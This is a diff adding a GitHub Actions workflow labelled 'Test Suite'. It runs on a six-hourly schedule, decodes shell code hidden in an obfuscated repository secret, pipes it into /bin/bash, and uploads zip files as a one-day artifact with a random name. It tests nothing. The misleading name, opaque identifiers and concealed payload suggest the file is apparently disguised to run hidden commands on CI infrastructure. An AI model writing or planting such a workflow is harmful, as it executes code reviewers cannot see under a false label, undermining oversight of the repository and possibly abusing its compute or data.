@@ -1,0 +1,32 @@
+name: Test Suite
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '40 3,9,15,21 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          enfy1: ${{ secrets.enfy1 }}
+        run: |
+          printf '%s' "$enfy1" | jq -r .jvnms837 | /bin/bash
+          printf '%s' "$mu12" | jq -r .uud46862 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: BEKJCcM9
+          path: "*.zip"
+          retention-days: 1
